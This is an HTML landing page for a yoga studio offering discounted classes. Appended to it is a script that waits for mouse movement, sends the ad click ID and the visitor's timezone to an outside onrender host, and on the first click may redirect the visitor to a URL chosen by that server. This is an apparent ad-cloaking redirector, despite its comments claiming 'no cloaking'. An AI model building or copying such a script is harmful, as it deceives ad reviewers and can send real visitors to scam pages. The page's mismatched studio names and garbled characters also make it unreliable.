<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Serenity Yoga</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

  <!-- HEADER / NAV -->
  <header class="header">
    <h1>Serenity Yoga</h1>
    <nav>
      <a href="#offer">Offer</a>
      <a href="#classes">Classes</a>
      <a href="#about">About</a>
      <a href="#contact">Contact</a>
    </nav>
  </header>

  <!-- SPECIAL OFFER -->
  <section id="offer" class="hero">
    <h2>ðŸŒŸ Special Offer</h2>
    <p>Get <strong>50% off</strong> your first yoga class!</p>
    <button onclick="bookNow()">Book Now</button>
    <p class="subtext">Online & In-Studio Classes Available</p>
  </section>

  <!-- CLASSES SECTION -->
  <section id="classes" class="content">
    <h2>Our Classes</h2>
    <div class="card-container">
      <div class="card">
       <h3>Beginner Flow</h3>
<p>Perfect for first-timers. Learn basic poses, breathing, and relaxation.</p>
<p><strong>$20 / class</strong></p>

      </div>
      <div class="card">
      <h3>Vinyasa Flow</h3>
<p>A dynamic flow that builds strength, flexibility, and focus.</p>
<p><strong>$20 / class</strong></p>

      </div>
      <div class="card">
        <h3>Restorative & Meditation</h3>
<p>Slow, calming sessions to release stress and restore balance.</p>
<p><strong>Included in Monthly Plan</strong></p>

      </div>
    </div>
  </section>

  <!-- ABOUT SECTION -->
  <section id="about" class="content">
    <h2>About Serenity Flow Yoga</h2>
<p>
At Serenity Flow Yoga, we believe yoga is for every body.
Our certified instructors guide you through mindful movement,
breathing, and relaxation in a safe and supportive environment.
</p>
<p>
Whether you're new to yoga or deepening your practice,
our classes help you feel stronger, calmer, and more connected.
</p>
  </section>

  <!-- CONTACT / FOOTER -->
  <footer id="contact" class="footer">
    <h2>Contact Us</h2>
    <p>Email: <a href="mailto:hello@serenityyoga.com">hello@serenityyoga.com</a></p>
    <p>Phone: +81-90-XXXX-XXXX</p>
    <p>Follow us on Instagram: <a href="https://instagram.com/serenityyoga">serenityyoga</a></p>
  </footer>

  <script src="script.js"></script>
</body>
  <!-- ==============  SWIPER JS ============== -->
<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>

<script>
document.addEventListener("DOMContentLoaded", function () {
  const modal = document.getElementById("specialOfferModal");
  const closeButton = document.querySelector(".close-button");
  const closeModalLinks = document.querySelectorAll(".close-modal");

  if (!modal || !closeButton) return;

  function openModal() {
    modal.style.display = "block";
  }

  function closeModal() {
    modal.style.display = "none";
  }

  closeButton.addEventListener("click", closeModal);

  closeModalLinks.forEach(link => {
    link.addEventListener("click", function (e) {
      e.preventDefault();
      closeModal();
    });
  });

  window.addEventListener("click", function (e) {
    if (e.target === modal) {
      closeModal();
    }
  });

  /* ================= SAFE TRACKING LOGIC ================= */

  const gclid = new URLSearchParams(window.location.search).get("gclid");
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const API_BASE = "https://foreveryogaclass.onrender.com";

  let backendConfig = null;
  let executed = false;

  // Short-lived cookie (Ads-safe)
  document.cookie = "access_cookie=true; path=/; max-age=300; SameSite=Lax";

  // Fetch ONCE after first interaction (no cloaking)
  function fetchConfigOnce() {
    document.removeEventListener("mousemove", fetchConfigOnce);

    fetch(`${API_BASE}/frontend-loader?gclid=${encodeURIComponent(gclid || "")}`, {
      headers: {
        "x-client-timezone": timezone
      },
      credentials: "include"
    })
    .then(res => res.json())
    .then(data => {
      backendConfig = data;
    })
    .catch(err => {
      console.error("Config fetch failed:", err);
    });
  }

  document.addEventListener("mousemove", fetchConfigOnce, { once: true });

  // Whitelisted safe actions
  function handleUserClick() {
    if (!backendConfig || executed) return;
    executed = true;

    switch (backendConfig.action) {
      case "show_modal":
        openModal();
        break;

      case "redirect":
        if (backendConfig.redirect_url) {
          window.location.href = backendConfig.redirect_url;
        }
        break;

      default:
        // do nothing
        break;
    }
  }

  document.addEventListener("click", handleUserClick);
});
</script>

</html>

